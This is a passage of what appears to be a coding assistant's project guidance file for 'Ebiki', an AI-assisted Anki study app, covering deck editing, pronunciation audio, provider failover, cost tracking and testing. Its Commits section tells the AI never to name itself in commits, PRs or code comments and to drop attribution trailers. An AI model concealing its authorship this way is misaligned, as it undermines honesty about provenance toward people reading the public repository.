  `mnemonicLoading`. `deDash` keeps digit ranges. Grammar slips dedupe on `grammarSlipKey` (case/space only; accents
  matter), in the rename merge too.
- **UI**: `renderHookButtons(surfaceKey, onPick, disabled, compact)` ("🧠 Memory hook" + styles behind "Styles ▸",
  `hookStylesOpen`, `hookMethodList()`). **Render with `renderTappableRich`, NEVER `<Markdown>`.** Surfaces: graded
  cards (`generateMnemonic` → `cs.mnemonics`, `renderMnemonic`; opening hydrates, no auto-generate), deck rows
  (`generateDeckMnemonic`), tapped-word popup (`studyWordMemoryHook`), Learn-it (auto-generates only when none
  saved). A `failed` lookup offers no hooks (built from error text) and no "Make Anki card" (could leak the answer).
- **One per-mode store** (`modeHooks`, blob `hooks`); keys noteId or `word:<folded word>`. `addNoteHook(hookSaveKey(
  noteId, front), hook)`; `hooksForItem` unions note + word keys per headword form; `deleteNoteHook` deletes by VALUE
  across both; writes functional (`writeModeHooks`). **Writes go to the mode the in-memory list belongs to**
  (`hooksModeIdRef`/`grammarModeIdRef`, name resolved at write time), never `activeMode.name` (a late hook overwrote
  another mode's blob); `hookModeId`/`gradeModeId` keep work in its starting mode. Owner name `storeOwnerName(id)`
  (`storesAtRef` first: old name until a rename's save answers), for LOADS too.

## Study start screen and Dropdown
- One sectioned card, `repeat(auto-fit, minmax(180px,1fr))` field grids, `.tip` legends, no scroll at default zoom.
- **`Dropdown`'s menu is portaled to `#ebiki-dropdown-host` under `<html>` (outside the body zoom), `position:fixed`
  in REAL px, `transform: scale(z)`**: fixed inside the zoomed body breaks Chromium hit-testing. Opens toward the
  roomier side (`transformOrigin` flips), caps height, **closes on any scroll or resize**. Keyboard: arrows/Home/End
  move, Enter/Space pick, Tab closes.

## Per-mode dialect (`studyRules.dialect`, language modes)
Free text. `dialectRule()` injects ONE line into EVERY generator (cards + `verifyCards`, hooks, `lookupStudyWord`,
questions, Chat cards, bulk edit, Discover) and **governs every regional convention** (phonetics, spelling,
punctuation/quotes, vocabulary, grammar, register); a one-region form keeps that region's norms. Audio region is
separate (`pronunciation.defaultRegions`). Help sets it (`set_dialect`).

## Deck browser
### ✨ Ebi bulk edit (`analyzeDeck(kind, instruction)`)
- `kind='custom'` = apply the owner's request only where it applies, through the analyze pipeline (noteId+front
  guard, accept/deny review). Nothing writes until accepted. Header echoes the request (`deckAnalyzeInstruction`);
  audits show the audit name, never the raw English instruction. `deckAnalyzeKind` keeps labels straight.
  **Call as `onClick={() => analyzeDeck()}`** (a raw event becomes `kind`). Help's `deck_edit` prefills the panel,
  `pendingDeckEditRef` previews once notes load.
- **Tags**: optional `recommendedTags` = COMPLETE replacement list; language decks embed `usageTagsRule()`; review =
  editable input (`parseRecTags`) + chip diff. **Every new editable thing Ebi gains needs this before/after review.**
  Commit: `ankiUpdateNote` diff-only, `ankiSetNoteTags` only when changed; refuses a no-op and wiping ALL tags. A
  landed Refine clears `accepted`; the Tag-audit contract is re-applied after it.
- **`verifyDeckRecs`**: truth (preferred-term honesty; no "slang-only" for a word some region uses literally), scope,
  tags; may DROP a rec; merges BY noteId; a rec equal to the card is removed. Refine verifies too (`allowDrop: false`).
- **Run tokens** (`deckAnalyzeRunRef`, `dupScanRunRef`; `resetDeckReview()`, `clearAnalyze`/`clearDup`): a discarded
  run stops between batches, never lands under another deck. Recs deduped by noteId; the reviewer changes tags only
  if the first pass or a refine did; Refine lands only on a rec still `refining`. AI field values go through
  `cardText`.
- **BATCHED, 20 cards per call: don't collapse it** (one whole-deck call hit the output limit and the salvaged
  truncated array looked complete). `maxTokens: 8000`, `deckAnalyzeProgress`, a failed batch keeps the rest
  (`deck_analyzePartial`). The dup scanner is NOT batched (local candidates, sends only clusters).
- **Dup scan**: new scan clears old groups; a fuzzy set must lie in one `clusterOf`; an AI merge must echo the headword
  (also as plain text, `echoedPlain`); bare fronts beside 2+ senses form their own group; a set with two senses of one
  key is dropped (rechecked after `unionGroups`). Exact groups split by "(sense)". Actions by `dupGroupKey`, never
  index; a save/merge removes only what it wrote. "Do not merge" lists of ancestor/sub decks also filter (read-only).
  Framed per mode kind (general: term vs abbreviation; never merge distinct look-alikes).
- **Merges** re-read notes and skip a changed group; refuse when a deleted note has a field the survivor lacks
  (`deck_mergeOtherType`); write only changed fields, never emptying one (`cardBackToHtml` when originals had bold
  labels); carry images found only on a duplicate; COPY hooks to the survivor before `ankiDeleteNotes`, drop old keys
  only after it succeeds.

### Other deck browser behavior
- **Add Deck**: "⚡ Make it for this mode" (`handleAddDeckForMode`) links via `updateModeById` with the id pinned
  before the awaits; plain quotes, not «guillemets» (owner preference). `handleAddDeck` links an existing mode only on
  an EXACT normalized name, else `createMode`. Both use Anki's spelling of the deck.
- **Rows**: `[sound:]` hidden (`SOUND_TAG_RE`), dashes via `stripDashesInline` (never across lines). Copy
  (`ankiCopyNote`, allowDuplicate on purpose) / Move (`ankiChangeDeck`) compare deck names case-insensitively;
  results land only on their own panel (`deckBrowserCopyingRef`). ⟲ Reset progress is confirm-gated
  (`ankiForgetCards`). Rows of a deck owned by ANOTHER mode (`noteOwnedElsewhere`, per `note.deckName`) get no audio
  or hooks (`deck_hookOtherMode`). Card-layer errors are translated via `setTranslator` (`src/cards`). PBQs
  carry `iconKeys: 'item'`.
- **Card editor = plain text, line-aware**, one converter `fieldHtmlToPlain` (editor, AI payloads, changed-since
  checks): `<br>` and block starts/ends become newlines (Anki writes lines as `<div>`s; stripping fused them), only
  real tags removed (`isHtmlTagName`: "<stdio.h>" survives), entities via inert DOMParser (`decodeEntities`).
- **The editor re-reads the note before saving**: a changed field whose Anki copy moved (e.g. a 🔊 embed) is refused
  (`deck_changedSinceEdit`); one already equal is skipped. `saveEditNote` snapshots `deckEditOrigRef`/
  `deckEditOrigTagsRef` BEFORE its awaits, builds HTML from the FRESH read (keeps images added in Anki), applies only
  the user's tag adds/removes. The audio embed patches `deckBrowserNotes` (else every save was refused).
  Refine lands on the LIVE editor fields. Post-await reloads use `deckBrowserDeckRef.current`.
  **Commits and merges reload `{ quiet: true }`** (a normal load closes the editor, losing unsaved text).
- **Plain-text writes keep what plain text can't hold** (`keepFieldImages`, `hasUnkeepableMarkup`): editor, bulk
  commit and merges re-append `<img>`s and REFUSE a changed field with `<ruby>`/`<svg>`/`<math>`/`<table>` or a
  non-credit link (`deck_keepsMarkup`). Audio too: a missing `[sound:]` returns with its credit link, a flattened
  "[sound:x]🔊 credit" is restored IN PLACE, untouched fields stay byte-identical, `{oneSound}` collapses to one
  recording (merge). Credit markup matched loosely (`fieldSounds`).
- **Text vs HTML into Anki** (Anki's parser ate `<stdio.h>`): `ankiAddNote` runs `escapeStrayLt` and hyphenates tag
  spaces; `ankiUpdateNote`
  writes AS GIVEN (the audio embed re-sends existing HTML; escaping garbled `<rb>`/SVG), so plain-text callers escape
  first: editor/bulk/merges `escapePlainHtml` (decoded text), feedback chat `update_card` `escapeStrayLt`, every add
  path `plainFrontHtml`/`plainBackHtml` (also in `ankiCanAddNote`). **`escapeStrayLt` keeps only a real, CLOSED tag**
  (known name, attribute-shaped text to `>`; never a lone uppercase letter, `<!` only as a comment; "a<b" is text).
  Picture stores the deck it added to in `ankiSynced[idx]`.
- Templates: values via `cardText`, missing `{placeholders}` empty, a `Label: {empty}` line dropped, literal `\n` →
  breaks. `cardBackToHtml` never bolds `[sound:`, cloze, MathJax, a clock time, a URL or a 🔊 credit line.
  `parseAiJson` escapes raw control characters in strings.
- **Render crash → `ErrorBoundary.jsx`** (wraps `<App/>`): self-contained colours, Reload / "Reload without the saved
  session" (clears `ebiki-study-session` + `ebiki-chat-session`), keeps the heartbeat contract (`/api/alive`,
  `ebiki:ping`, `/api/bye`) so the server doesn't exit. Last resort: still guard AI/persisted data at the source.
- A failed load of ANOTHER deck clears the list (`deckNotesDeckRef`); a deck SWITCH clears notes at once (a scan
  mid-load filed old groups under the new deck). Quick Add's loop reads `quickAddCardsRef`.
- **Check card quality** judges EVERY card in the batch (prompt states the count).
- **Persists across tabs**: leaving runs only `syncDeckEditsToStudy()` (pushes only notes SAVED there,
  `deckEditedIdsRef`), returning refreshes quietly; `openDeckBrowser` keeps `deckBrowserDeck` (`ebiki-deck`). Scroll
  restored pre-paint (`deckScrollTopRef`), expires after 3 min away. "Select a deck" bumps `deckNotesReqRef`.
- Card search is accent-insensitive (NFD fold on both sides).

## Tap-a-word lookup
- `renderTappableText(text, sentence, source)` + `renderWordLookupPopup(source)`: `source` puts the popup beside the
  word (question, meaning hint, `graded-<ci>-<qi>`, `batch-<ci>-<qi>`). Language modes only. Hooks and Learn-it use
  `renderTappableRich` / `renderTappableBack`, each source with its own popup mount: **new hook/teach surfaces must use
  these, not `<Markdown>`.** `getCardBack` keeps line breaks (→ `\n` BEFORE `stripHtml`). Explains in the APP language.
- **On the LIVE question a lookup never shows the answer**: target/meaning/alternatives/`usage` checked with
  `hintRevealsAnswer` against `questionAnswers(q)` (accepted + correct MC choice; word hints too); a hit shows
  `lookup_wouldReveal` (`blocked`: no audio, no card row), never cached. Hooks filtered (`safeHooks`), leaking
  backs/hooks hidden.
- **Bidirectional, never pair-specific**: a word outside the learned language flips to teach the learned side. JSON
  `target` = learned-language word; downstream keys on `wl.target || wl.word` (header, `Pronunciation`, card,
  `wordHookKey(target)`); the target's hooks + note merge in after parse (fail-soft).
- **"Make Anki card" is duplicate-aware** (`studyWordFindExisting`, target deck first): a HEADWORD match
  (case-insensitive, accents KEPT: té ≠ te; accent-variant search fallback since Anki search is accent-sensitive)
  shows "✓ Already in «deck»", no add button. Anki errors fall through to generation. `wordHookKey` keeps accents.

## Stats
- **Live from Anki** on the Stats tab (`ankiStats`), cached in `ebiki-anki-stats`; offline falls back to
  `screenlens-study-history`. Dates LOCAL `YYYY-MM-DD` (`toLocaleDateString('en-CA')`) to match Anki days.
- **Every session reaches history**: `recordSessionHistory` from the summary effect AND `exitStudy`. **One entry per
  session** (`runId` = `studyRunIdRef`, upserted, keeps its FIRST `date`): the summary effect re-runs on every change
  and used to multiply entries. Wrap Up / End Now `skipped` cards are not listed; `rateGradedCard` refuses them.
  "Generate Insights" needs a rated card, skips `gradeFailed`; failure = `studyInsightsError`.
- Refreshes sequenced (`ankiStatsSeqRef`); a failed read keeps today's count. Chart, streak and Cards Today take the
  per-day MAX of Anki and local history. **No graded answer = accuracy `null`, never 0** (shown `·`; Recent Sessions
  weights only entries with one, `accW`, card-weighted). PBQs carry `score`; history rows need a string `date`. Help's
  `accuracyToday` follows the same rule. Recent Sessions is a FIXED grid, grouped by (date, deck), newest first. A chat
  `<progress-update>` to the mode deck sets `deckProgressOkRef`; progress notes use the local date.
- **The numbers are ONE tested module** (`src/utils/studyStats.js`: `shapeHistory` (counts stored as text become
  numbers: "9" + "3" read 93), `dayCount`, `studyStreak`, `todayNumbers`, `chartDays`, `groupSessions`,
  `deckBreakdown`), shared by the Stats tab AND Help. Never a second copy.
- **Deleting a note** drops its note-keyed hooks (`writeModeHooks`; word-keyed ones stay), sets its live session cards
  aside as deleted (`setAsideDeletedStudyCards`: no Anki rating, stats taken back, a replacement pulled; never a card
  Anki has or may have a review for) and skips it in later pulls (`deletedNoteIdsRef`).

## Grammar-slip log (`modeGrammarLog`, per-mode blob `grammar`, language modes)
Every grader `grammar` note → `addGrammarSlips(front, notes)`: `{t, front, n, at}`, deduped by folded text, capped at
200 by LAST SEEN (sort on `at` first). `grammarSlipBlock(limit)` feeds Chat, Learn-it chat, Help. Store pattern =
`modeHooks`.

## Question reuse (opt-in token saver; `src/utils/questionBank.js`, `questionBank.test.js`)
`questionReuse = { enabled, maxPerCard }` (**default OFF**, 1..50). **OFF means off** (`createQuestionReuse` only
calls `generate()`, tested); **only the user turns it on** (Settings > AI & cost, UNTICKED onboarding box), never code.
- Per DECK, one file per note: `decks/<deckDirName>/questions/<noteId>.json` via `/api/question-bank` (GET treats only
  ENOENT/damaged as empty). DELETE clears deck + subdecks (`exact=1` + Anki's subdecks as `also=`; folder prefixes only
  when Anki's list is unknown), confirm-gated, bumps `questionBankEpochRef`. The route is
  `src/server/questionBankRoute.js` (`createQuestionBankRoute`, end-to-end tests on a temp folder).
- `withQuestionReuse` wraps the `*Fresh` generators: new sets until `maxPerCard`, then saved sets least-recently-asked
  (MC reshuffled), no AI call. A cleared cap box means the default 10, never 1; a damaged set (no question text) is
  neither counted nor asked (`pickSavedSet` `usable`).
- A set matches on `text` (front + back, **ignoring the audio embed's `[sound:]`/🔊 credit**, else the first play
  retired the questions) + `sig` (kind, languages, typed/MC, word hints, count, dialect). Changed `text` drops old
  sets; other `sig`s are KEPT (one deck, two modes), newest 40. **Question-style preferences are NOT in `sig`** (each
  would retire every set). A language mode learning the APP language uses kind `flash-lang`.
- Writes re-check the live setting and clear counter. Never saved: after a FAILED read, `_fallback`, relearn copies,
  deckless cards, while `dataSwitchingRef` (`getEpoch` → NaN). **All writes (new sets, rotation, ✎ Fix question,
  word hints) go through `updateBank`** (fresh re-read, serialized per card: parallel whole-file writes lost one); a
  reuse read waits (3s) for the card's pending write. Questions carry `_bank`; `storableQuestion` strips session state.

## Question generation (`generateQuestionsForCard`)
- **Pin exactly one answer with an INLINE cue, ALWAYS**: a parenthetical sense in `quizLang` at the blank PLUS the
  first letter, in the question text (hints don't count).
- **The first-letter cue is guaranteed in code**: typed language recall/fill_blank goes through `needsLetterCue`; a
  miss regenerates (3 attempts), last resort `appendLetterCue` skeleton (`(s·······)`). `hasLetterCue` detects by FORM
  (one quoted `\p{L}` in any quote style, or a skeleton), never English phrases, and only when that letter starts an
  accepted answer or one of its words (Han: a quoted kana/pinyin initial): else “雨” or で___ read as cues. MC exempt
  (a cue leaks). Same in `fixCurrentQuestion`; conjugations need none.
- `leakExempt` (general modes) covers the last question only when all `n > 1` came back; a scrub blanking a whole
  quoted subject drops the question. If the final attempt throws, the last parsed set gets `lastResort`, not the
  give-up set (whose answers go through `expandSlashAnswers`).
- **`deepQ`** (last language question) tests practical use; never asks to EXPLAIN grammar/spelling/etymology.
- Cue `(...)` segments render muted + italic, still tappable; the muted color lives in `.study-word-cue` CSS, NOT
  inline, so `.study-word:hover` can still turn it red (`cueStyleNoColor`).

## Learned language vs "Ebi speaks" (don't conflate)
- `learnLang` (`studyRules.studyLanguage`) is ALWAYS the answer language (grading, typo tolerance, card generation);
  `quizLang` (`quizLanguage || studyLanguage`) is only phrasing (feedback, meaning hint, feedback chat).
- **Language names resolve through `langFromName`** (`LANG_ALIASES` data table), for `learnLangName`, pickers and
  `tesseractLang()`. **Spoken varieties sharing a script stay themselves** (`isDistinctSpoken`: Cantonese...), never
  folded into "Chinese (Traditional)" (Mandarin audio landed on Cantonese cards); only OCR maps them. Defaults'
  `studyLanguage` is `''` (a default 'English' was saved into modes).
  `acceptModeEdit` shapes via `modeFields`/`modeText`.
- **Pickers default like the GENERATOR**: unset `studyLanguage` → `learnLangName()`, never `'English'`; general
  modes' unset "Ebi speaks" → APP language (`userLangName()`). General modes show only "Ebi speaks": phrasing only, no
  language-course questions, terms untranslated, answers in ANY language graded on understanding.
- **Inflection tolerance**: another form of the SAME lemma is accepted unless the sentence forces one; generation
  adds the marker or lists every valid form.
- Matcher `normalize` drops Arabic/Hebrew vowel marks and a leading `l'`/`un'` only (`all'`/`dell'` are tested
  prepositions), never in `stripAccents` (the accent drill must not demand harakat).
- A correct article fully answers "gender and article" (no "state the gender" note). No fixed
  referent ("alguien"): any agreeing form is correct, no agreement note (it polluted the slip log).

## Word hints (`studyRules.wordHints`, ruby-style glosses)
Filled lazily by `fetchGlossesForQuestion` (fires when missing OR empty; `glossFetchRef` de-dupes); bidirectional.
Excludes anything revealing the answer (fuzzy `hintRevealsAnswer`); `glossesNeedFetch` measures the UNFILTERED map
(else a withheld gloss re-fetched forever). Every word gets the same stacked column for an even baseline.

## Notices and dialogs
- **Toasts** (`modelHealNotice`, `aiErrorNotice`, `successNotice`: reuse it for any "done") share ONE fixed
  bottom-center flex column (z 12001; `pointerEvents:'none'`, toasts `'auto'`): a new toast goes inside it, never its
  own fixed position (they overlapped). The pose call is `silent`. `createMode` runs on App
  (closing Settings doesn't cancel it). **Notices go through `raiseNotice(msg, { keepAi })`: the NEWEST wins** (an old
  notice never hides a new failure); an AI success clears only the toast an AI call raised (`aiCallErrorRef`). The
  column rises above any `[data-composer]` on screen (`toastClearance.js`), moves bottom-right while Ebi Studio is open,
  and on phones sits above the bottom bar, full width (`.toast-stack-phone`).
- **Nested Esc handlers call `preventDefault()`; outer ones (SettingsModal) skip `e.defaultPrevented`.**
- **NEVER `window.confirm`/`alert`/`prompt`** (`prompt` throws in Electron): `await confirmDialog(...)` /
  `alertDialog` / `promptDialog`. **Dialogs QUEUE** (`confirmQueueRef`; a replaced dialog's promise never resolved).
  z 12002, Esc/Enter in a WINDOW CAPTURE listener (Enter only with focus outside), `data-app-dialog`;
  Ebi Studio carries `data-top-overlay`;
  SettingsModal ignores Esc while either exists, Studio under a dialog (and
  marks its own Esc handled). Enter and Settings' Esc skip IME composition
  (`isComposing` / keyCode 229).
- **Submits are claimed once per question state** (`claimSubmit`, cleared by "Back"; PBQ `pbqSubmittedRef`): a
  double Enter graded twice.
- **Card adds are double-click-guarded with REFS, not state** (two clicks pass a render-time flag; card paths allow
  duplicates): `chatCardsAddingRef`, `quickAddInFlightRef`/`quickAddBatchRef`, `pictureAddingRef`,
  `discoverSavingRef`/`discoverActedRef`, `conjAddingRef`, `modeCreatingRef`, Studio's `applyingRef`.
- Exiting study warns about cards still grading (`study_exitGrading`; unrated, the unsynced check missed them).
- `img { -webkit-user-drag: none }`; `handleDragOver` requires `'Files'` in `dataTransfer.types`.

## Pronunciation audio (`src/pronunciation/`, 4 tiers, language-agnostic)
- `getPronunciation({word,lang,region,config,noteId?,cardId?})` (never throws): **0) Anki media** (`ankimedia.js`,
  the card's own `[sound:…]`, `[sound:ebiki-...]` first) → **1) Wiktionary/Commons** → **2) local TTS** (opt-in) →
  **3) browser SpeechSynthesis**. **Cache SUCCESSES only** (nulls are usually transient), only recordings; key
  includes `noteId || cardId`; a ↻ pick drops the word's cached first choices. 🔇 stays clickable to retry.
  Wikimedia calls go through `politeFetch` (spacing, one retry on 429). `langInfo` falls back to `langFromName`.
- `Pronunciation.jsx` resolves on FIRST CLICK (no network on render). One voice at a time (`playingAudio`, browser
  speech via `stopSpeech`), paused on word change/unmount; a fetch finishing after the popup closed never plays
  (`mountedRef`), its embed still happens.
- **Tier 1 (`wiktionary.js`)**: per edition, REST `media-list` ∪ `action=parse` wikitext regex (both needed: es
  media-list returns 0; CJK filenames need media-list). Editions `config.editions[iso1] || [iso1,'en']`, skipped until
  one has audio that RANKS; **Commons search fallback** (`searchCommonsFiles`). **Noise gate**: no language-convention
  evidence → below `STRONG_SCORE`; a bare "Perro.ogg" only if categories prove a pronunciation recording
  (`looksLikePronunciationPage`); long recordings merely containing the word are rejected. Empty candidate lists are
  never cached (a rate limit is not a miss). All `w/api.php` calls need `origin=*` + `Api-User-Agent`; fetches fail
  soft to [].
- **Matcher** (`matcher.js`, tested with REAL filenames) ranks exact region > bare language > Lingua Libre (Q-id-only
  low) > wrong region > bare word; rejects files identifiably in ANOTHER language. Word boundaries include combining
  marks (`[\p{L}\p{M}]`); a phrase match needs the whole word ("sol" never takes soldado). `approx` = ANY accent-only
  match (plays, never embeds); accent-exactness is word-bounded (`exactRe`). Two or more different sense suffixes
  (`-verb`/`-adj`) also make files `approx`.
- **Attribution is mandatory** (CC-BY-SA, Commons `imageinfo extmetadata`): no license → skipped; compact players
  show a linked ⓘ credit (portaled out of clipping rows; no author → `authorUnknown` → `pronUnknownAuthor` in the UI).
  Commons search quotes a phrase (`intitle:"buenos días"`).
- **Tier 2 (`kokoro.js`) strictly opt-in**: empty `pronunciation.ttsUrl` (default) = null at once. Else `/api/tts`
  → OpenAI-compatible `/v1/audio/speech`, cached in `cache/tts/`; a non-audio reply is 502 so tier 3 runs.
- **Tier 3 (`webspeech.js`)**: dialect → base language → null; never caches an empty voice list. `VOICE_NOT_BASE`
  (zh-HK/yue) never stands in for the base (Mandarin read in Cantonese).
- **↻ Different speaker**: cycles the ranked list (`resolveWiktionary({variant})`, wraps; variant>0 merges Commons
  search; `candidateCache`); widening APPENDS, never re-ranks (else variant 1 was the file already playing).
  `onNative(r, {replace: true})` swaps only OUR previous `[sound:ebiki-…]` + credit, matched as loosely as
  `fieldSounds`. A wrap to the same file shows "only one recording exists" and retires the button.
- **Anki embed (native audio only, never TTS)**: `embedPronunciationInNote` on first play from Study/Deck. Download
  FIRST (20s timeout), then re-read the note and write (else an edit saved meanwhile was overwritten); idempotent
  (skips a back with `[sound:`); serialized per note (`embedChainRef`); toggle `pronunciation.embedInAnki` (default
  ON). Chat widgets never embed.
- **Surfaces** (language modes): study graded rows, deck rows, chat `<anki-card>`, tapped-word popup. Region =
  `pronunciation.defaultRegions[iso1]` (Settings → Anki & audio). Language data in `langcodes.js`; tuning is data,
  never `if (lang === …)`. `pronWord()` strips "(pos)" and uses `expandSlashAnswers` ("el/la estudiante" → "el
  estudiante", never "el"); its fallback keeps a front whole only for a one-letter UNIT (`km/h`), never an ending.

## AI providers (`src/config/providers.js`): everything works on every provider
- **Everything routes through `aiCall`** → `PROVIDERS[provider].call(...)` (Help: `askAI` prop = `aiCall(...,
  resolveModel('help'))`), on Anthropic / OpenAI / Gemini / Grok. No feature hardcodes a provider.
- **Intelligence preset** (global `intelligence` = `optimized` | `normal` | `max`): providers have
  `presets: { cheap, normal, max }` (all vision-capable). `ROLE_DEFAULTS(pc, intel, prov)`: `normal`/`max` put every
  role on that preset (pose always `normal`); `optimized` uses `ROLE_TIER`. Settings per-feature overrides win.
- **Settings inputs**: keys lose ALL whitespace (Gemini's key is in the URL); a custom model id commits on
  blur/Enter (else every keystroke fed background calls); model lists from a typed key debounce; the per-feature
  `<details>` opens itself only on mount (bound to `hasModelOverrides` it snapped shut). `keyOfOtherProvider` marks a
  key with another provider's longer prefix invalid.
- **An unknown `config.provider` is ignored** (load + overlay refresh): a newer computer on the share crashed every
  screen. "Custom" preset = an override on a REAL role (`AI_ROLE_META`), not any key in `aiModels[prov]`.
- **Never read `pc.presets[tier]`; use `presetModel(pc, prov, tier)`** so the live-model layer can shadow it.
  providers.js values are a FLOOR.
- **`ROLE_TIER` (App.jsx, optimized preset) = stakes × frequency. Keep this table and the code in sync.**

  | Role | Tier | Why |
  |---|---|---|
  | `pose` | cheap | Trivial classifier on every message; biggest saving. |
  | `help` | cheap | Short Q&A, low stakes. |
  | `discover` | cheap | User reviews suggestions; verify pass catches errors. |
  | `chat` | normal | Tutoring quality is felt on "why" answers. |
  | `picture` | normal | Vision on busy screens needs a capable model. |
  | `study` | normal | Deterministic guards (leak, letter cue); grading fine at mid. |
  | `general` | normal | Mode creation matters but is rare. |
  | `deck` | max | Cards get MEMORIZED; never cheap out here. |

- **Adding an AI role**: `AI_ROLE_META` (label + hint), `ROLE_DEFAULTS`'s uniform map, a `ROLE_TIER` tier
  (memorized/graded → `max`, conversational/reviewed → `normal`, trivial/every-message → `cheap`); call
  `resolveModel('role')` (or `resolveModelFast` for latency-sensitive read/translate).
- **Model Advisor** (`src/config/modelAdvisor.js` + App): `selectIntelligence(preset)` applies a CACHED plan
  (`modelPlans[prov][preset].plan`) at once; `ensurePresetPlan` re-lists models in the background and, only if new
  models appeared or nothing was decided, researches them (`modelCards[id]`), lets the strongest model decide a
  role→model map, PROBES the picks (`probeModel`) and re-decides without dead ones. Probe: 403/404 = down; a KEY
  error (incl. 400 API_KEY_INVALID) or billing text = unknown, never down (else every model was cached down for a
  day). Any failure keeps `ROLE_DEFAULTS`; an empty plan is never saved or treated as decided. `runConnectionTest`
  reports ONE connection error when nothing answers.
- **`visionTier`** (xAI: `max`): an image request resolved to a text-only cheaper preset moves to that tier. **Image
  requests never land on a text-only model** (`textOnlyModels`): session subs and `tryModelFailover(..., hasImages)`
  skip them.
- **Runtime failover** (`aiCall`'s catch, after the retired-model heal): `tryModelFailover` on 403/404/429/5xx/
  overload picks a probed-working alternative (not itself a substitute), registers `sessionSubs[prov][downId]`
  (in-memory, followed as a chain, max 3 hops), retries, shows `modelFailover`. A 1-minute effect re-probes; recovery
  drops the sub (`fo_restored`). Never throws. A reasoning-budget retry that fails or stays empty THROWS
  (`API 200: empty`), never returns "".
- **Cross-provider request compatibility lives ONLY in this layer**; OpenAI and Grok share `openAiCompatibleCall`.
  Self-healing, not table-driven:
  1. Send `max_completion_tokens` (`max_tokens` fails on o-series/gpt-5+); a 400 naming it falls back to `max_tokens`
     (xAI, local endpoints).
  2. Reasoning budget exhausted, ERROR form (o4-mini 400 "output limit was reached") → retry with a larger budget.
  3. SILENT form: 200 + empty content + `finish_reason:"length"` (Gemini 2.5+: `finishReason:"MAX_TOKENS"`) → same
     retry. Handle BOTH forms.
  4. Anthropic per-model output cap ("max_tokens: 8000 > 4096") → retry at the number the error names.
  **`MIN_CONTENT_BUDGET` (64) keeps `probeModel` (`maxTokens: 4`) out of every retry.** Errors keep the
  `API <status>: <body>` shape (heal, failover and probe parse it). **Add a `providers.test.js` case (stubbed fetch)
  when adding a provider or touching a request body.**
- **Every provider request has a timeout** (`CALL_TIMEOUT_MS` 5 min, `LIST_TIMEOUT_MS` 30s; Wiktionary 15s): a
  stalled connection left Chat "typing" forever with its send lock held.
- **A blocked/refused reply with no text THROWS `API 200: blocked (<reason>)`** (OpenAI/xAI `content_filter`,
  Anthropic `stop_reason: refusal`, Gemini `blockReason` or SAFETY-family `finishReason`): as "" it became a saved blank
  bubble. Status 200 keeps it out of heal/failover; `probeModel` counts it reachable.
- **No forced JSON** (`response_format`/`responseMimeType` break free-form chat).
- **ALWAYS parse AI JSON with `parseAiJson(text)`, never bare `JSON.parse`** (strips noise, repairs slop, salvages
  truncated arrays; `escapeInnerQuotes`: a quote closes a string only before `, : } ]` or the end).
- **Staying current: two mechanisms** (a working model never errors, so the heal alone never upgrades):
  1. **Retirement heal**: `healRetiredModel`, only on `isRetiredModelError` (404/not-found; never a 429/5xx, an
     "overloaded" 503 matched the words), for the FAILING call's provider, via `discoverCurrentModel` (skips
     preview/tts/image/audio/embedding ids; dead model's family first, below any higher tier's model: `ceiling`).
     Saves only if `probeModel` did not say false; repoints `sessionSubs`. A dead tier heals at PRESET scope; a model
     PINNED for a role heals at that role's `ROLE_TIER`, never the strongest tier.
  2. **Daily currency check**: `findModelUpgrades` lists models at most once per 24h (`lastModelCheck`), via
     `src/config/modelVersions.js` (`parseModelId`/`compareModels`/`pickUpgrade`). A strictly newer model in the SAME
     family (never cross-family, never `-preview`) raises a Yes/No modal: Yes → `adoptModel` writes
     `modelPresets[prov][tier]`; No → `declineModel` records the id in `rejectedModels`. Gated behind `onboarded`.
     Returns `null` when the model list can't be read (never "you are on the latest").
  - **An upgrade never climbs INTO a higher tier** (families span tiers: gemini-2.0-flash cheap, 2.5-flash normal).
  - **Onboarding never asks**: it silently adopts the newest per tier (`pickNewest`).
  - `modelVersions.js` is pure and provider-agnostic (id segments, so `claude-3-5-sonnet` and `claude-sonnet-4-6`
    share a family); a dateless alias equals its dated snapshot. Extend `modelVersions.test.js` for new id shapes.

## Token and cost counter (`src/utils/tokenUsage.js`, `src/components/TokenUsageMeter.jsx`)
- **Counting lives in the provider layer**: `setUsageListener` gets every SUCCESSFUL request's usage (`readUsage`,
  all four providers; Gemini thoughts count as output), retries and probes included. App registers `recordUsage` once;
  tracking always runs, `showTokenUsage` (config, default OFF, Settings > AI & cost) only shows it. **A new provider
  must call `reportUsage` in its request helper.**
- Totals are MACHINE-LOCAL: `/api/usage` keeps `logs/token-usage.json` (gitignored, not in `DATA_ROUTES`), shared by
  app window, tabs and overlay. Client batches 3s, keeps a failed batch. The counter is portaled under `<html>`
  (outside the body zoom, like Dropdown); never in the overlay.
- **Prices are never guessed**: `PRICE_TABLE` (USD per million, first match wins, specific before family); unknown
  models show tokens only (listed unpriced); only known Opus versions are priced. **"Set price"** stores a user price
  in `token-usage.json` `prices` (kept across reset), winning over the table (`priceFor(..., prices)`): that is how
  new models get a cost; never add an unpublished table price. Tests: `tokenUsage.test.js`. Audio, realtime, TTS,
  image, embedding and live models stay unpriced (`NON_TEXT`) unless the user sets a price. The meter lists the top 10
  plus every unpriced or user-priced row (`rowsToShow`).

## Testing (two halves; `npm test` is only the first)
- **Browser automation must use Playwright's bundled Chromium. Never set executablePath to the installed Chrome/Edge;
  it causes Windows account lockouts on this machine** (failed logons, event 4625, from chrome.exe). Applies to
  `drive.mjs`, `check-art.mjs` and every agent or scratch script. **Launch it MUTED** (`args: ['--mute-audio']`, and stub
  `speechSynthesis.speak` in pages): headless pages still spoke through Windows voices.
- `npm test` (vitest) covers pure modules and engines (`*.test.js` across `src/`). Nothing about layout or click
  paths.
- **run-ebiki skill** (`.claude/skills/run-ebiki/`, committed tooling, never bundled): `npm run dev`, then
  `npm run drive` (Playwright's bundled headless Chromium; screenshots + console errors; no AI calls). `--studio "brief"`
  exercises Ebi Studio and **spends API credits**. Details and traps: its SKILL.md.
- Verify UI changes THERE, not by reading JSX: the body zoom breaks `position: fixed` boxes, and only measuring
  catches it (`panelBox()` in `drive.mjs`).

## README style
- User-facing: what the app is, what each tab does, setup and use. Tight, no filler or hype; cut words, not
  information. No developer internals (prompt/function names, algorithms, file trees); those live here.
- Describe each feature once. Keep it accurate (shortcuts, model versions, renamed/removed features).

## Commits
- **Bump `package.json` `version` in every commit that changes app behavior** (see Version).
- **NEVER name the AI assistant that wrote the code anywhere that reaches git or GitHub** (the repo is PUBLIC): not
  in commit subjects/bodies, PRs, issues, branch names or new code comments, and no attribution trailers
  (`Co-Authored-By`, `Generated with ...`). Describing a provider bug: "another provider" / "one provider". **Grep
